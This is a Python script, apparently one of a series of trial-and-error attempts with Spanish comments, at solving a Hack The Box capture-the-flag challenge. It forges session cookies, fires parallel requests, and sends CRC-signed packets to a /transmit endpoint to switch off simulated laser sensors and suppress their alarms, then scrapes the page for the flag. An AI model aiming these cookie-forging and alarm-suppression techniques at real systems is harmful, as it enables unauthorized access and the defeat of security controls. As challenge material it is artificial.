#!/usr/bin/env python3
import requests
import struct
import time
import re

def crc16(data, poly=0x1D0F):
    crc = 0x0000
    for byte in data:
        crc ^= (byte << 8)
        for _ in range(8):
            if crc & 0x8000:
                crc = ((crc << 1) ^ poly) & 0xFFFF
            else:
                crc = (crc << 1) & 0xFFFF
    return crc

base_url = 'http://94.237.53.81:59575'

# INNOVACIÓN 88: Manipular la cookie de sesión
print("[*] INNOVACIÓN 88: Cookie manipulation")
s = requests.Session()
r = s.get(base_url)

# Obtener cookie
original_cookie = s.cookies.get('session', '')
print(f"Original cookie: {original_cookie[:50]}...")

# Probar modificar la cookie
modified_cookies = [
    original_cookie + 'admin',
    original_cookie + 'flag',
    'admin.session',
    'flag.session',
]

for cookie_val in modified_cookies:
    s2 = requests.Session()
    s2.cookies.set('session', cookie_val)
    r = s2.get(base_url)
    if 'HTB{' in r.text:
        print(f"[SUCCESS with cookie: {cookie_val[:30]}]")
        print(re.findall(r'HTB\{[^}]+\}', r.text))
        break

# INNOVACIÓN 89: Enviar múltiples transmit POST en paralelo
print("\n[*] INNOVACIÓN 89: Parallel POSTs")
import threading

def post_packet(session, addr, cmd):
    data = bytes([addr, cmd])
    crc = crc16(data)
    packet = (data + struct.pack('<H', crc)).hex().upper()
    session.post(f'{base_url}/transmit', data={
        'freq': '433.92',
        'mod': 'ASK',
        'bits': '1',
        'msg': packet
    })

s = requests.Session()
s.get(base_url)

threads = []
for addr, cmd in [(0xE1, 0xFF), (0xE2, 0xFF), (0xE3, 0xFF), (0xA1, 0xF1), (0xA2, 0xF1), (0xA3, 0xF1), (0xA4, 0xF1)]:
    t = threading.Thread(target=post_packet, args=(s, addr, cmd))
    threads.append(t)

# Start all at once
for t in threads:
    t.start()

for t in threads:
    t.join()

time.sleep(3)
r = s.get(base_url)
sensor_states = re.findall(r'spinner-grow (text-\w+)', r.text)
print(f"States after parallel: {sensor_states}")

if 'HTB{' in r.text:
    print('[SUCCESS]', re.findall(r'HTB\{[^}]+\}', r.text))

# INNOVACIÓN 90: Enviar la secuencia en orden estricto del documento
print("\n[*] INNOVACIÓN 90: Orden estricto según el documento")
s = requests.Session()
s.get(base_url)

# El documento dice: "activate laser systems (E1, E2 & E3)"
# Luego: "Any failure in laser systems will trigger the alarms (A1, A2, A3 & A4)"
# Entonces primero deben FALLAR los láseres, luego suprimir alarmas

# Step 1: Hacer que los láseres FALLEN (apagar)
print("[*] Step 1: Turn OFF lasers")
for addr in [0xE1, 0xE2, 0xE3]:
    data = bytes([addr, 0xFF])
    crc = crc16(data)
    packet = (data + struct.pack('<H', crc)).hex().upper()
    s.post(f'{base_url}/transmit', data={'freq': '433.92', 'mod': 'ASK', 'bits': '1', 'msg': packet})
    time.sleep(0.2)

time.sleep(2)
print("[*] Checking status after laser shutdown...")
r = s.get(f'{base_url}/updates')
print(r.text[:200])

# Step 2: AHORA suprimir las alarmas que se activaron
print("\n[*] Step 2: Suppress alarms")
for addr in [0xA1, 0xA2, 0xA3, 0xA4]:
    data = bytes([addr, 0xF1])
    crc = crc16(data)
    packet = (data + struct.pack('<H', crc)).hex().upper()
    s.post(f'{base_url}/transmit', data={'freq': '433.92', 'mod': 'ASK', 'bits': '1', 'msg': packet})
    time.sleep(0.2)

time.sleep(3)
print("\n[*] Final status:")
r = s.get(base_url)
sensor_states = re.findall(r'spinner-grow (text-\w+)', r.text)
print(f"States: {sensor_states}")

if 'HTB{' in r.text:
    print('[SUCCESS]', re.findall(r'HTB\{[^}]+\}', r.text))

# Verificar updates también
r = s.get(f'{base_url}/updates')
if 'HTB{' in r.text:
    print('[SUCCESS in updates]', re.findall(r'HTB\{[^}]+\}', r.text))
else:
    print('[*] Updates:', r.text)

print("\n[*] Innovaciones 88-90 completadas")
